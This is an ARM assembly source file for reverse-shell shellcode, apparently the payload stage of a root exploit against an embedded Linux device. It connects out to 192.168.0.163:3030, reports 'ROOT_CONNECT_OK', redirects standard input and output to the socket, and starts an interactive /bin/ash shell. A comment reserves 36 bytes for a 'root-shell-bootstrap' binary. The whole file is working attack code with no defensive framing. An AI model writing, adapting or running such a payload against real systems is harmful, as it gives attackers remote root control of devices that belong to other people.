.syntax unified
.arm
.global _start
.section .text

/* The first 36 bytes are replaced by root-shell-bootstrap.bin. */
.space 36

_start:
    /* socket(AF_INET, SOCK_STREAM, 0) */
    mov r0, #2
    mov r1, #1
    mov r2, #0
    mov r7, #281
    svc #0
    cmp r0, #0
    blt fatal
    mov r4, r0

    /* connect(socket, 192.168.0.163:3030, 16) */
    adr r1, sockaddr_connect
    mov r0, r4
    mov r2, #16
    mov r7, #283
    svc #0
    cmp r0, #0
    blt fatal

connected:
    mov r0, r4
    adr r1, banner
    mov r2, #16
    mov r7, #4
    svc #0

    /* dup2(socket, 0..2) */
    mov r0, r4
    mov r1, #0
    mov r7, #63
    svc #0
    mov r0, r4
    mov r1, #1
    mov r7, #63
    svc #0
    mov r0, r4
    mov r1, #2
    mov r7, #63
    svc #0

    /* execve("/bin/ash", {"ash", "-i", NULL}, {PATH=..., NULL}) */
    mov r3, #0
    push {r3}
    adr r2, path
    push {r2}
    mov r2, sp
    push {r3}
    adr r1, argi
    push {r1}
    adr r1, arg0
    push {r1}
    mov r1, sp
    adr r0, shell
    mov r7, #11
    svc #0

    adr r1, exec_fail
    mov r0, #1
    mov r2, #12
    mov r7, #4
    svc #0

fatal:
    mov r0, #111
    mov r7, #1
    svc #0

.align 2
sockaddr_connect:
    .hword 2
    .byte 0x0b, 0xd6
    .byte 192, 168, 0, 163
    .space 8
banner:
    .ascii "ROOT_CONNECT_OK\n"
exec_fail:
    .ascii "EXEC_FAILED\n"
shell:
    .asciz "/bin/ash"
arg0:
    .asciz "ash"
argi:
    .asciz "-i"
path:
    .asciz "PATH=/sbin:/usr/sbin:/bin:/usr/bin"
